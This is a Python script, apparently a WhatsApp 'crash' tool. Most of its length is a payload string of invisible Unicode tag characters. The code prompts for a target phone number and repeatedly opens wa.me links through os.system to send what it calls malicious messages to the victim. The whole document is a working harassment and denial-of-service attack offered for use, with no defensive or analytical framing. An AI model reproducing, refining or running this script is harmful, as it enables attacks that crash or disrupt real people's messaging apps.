󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓??󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦??󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊
    """}
    
    data = urllib.parse.urlencode(crash)
    VictimNumber = input (Fore.RED + " Enter target phone number [Including Country code]: ")
    if "2349052863644" in VictimNumber:
        print(Fore.YELLOW + "You can\'t use my script against me 😂😂😂")
        exit()
    url = "https://wa.me/" + VictimNumber +"?" + data
    j = "xdg-open " + url
    try:
        global Times
        Times = int(input(Fore.RED + "\nEnter the number of sending malicious messages: "))
    except ValueError:
        print(Fore.RED + "Value must be an integer only")
        t.sleep(2)
        loop()
    for x in range(1, Times + 1):
      os.system(j)
      t. sleep(15)
    print(Fore.GREEN + "Done sending malicious messages to " + VictimNumber)

loop()
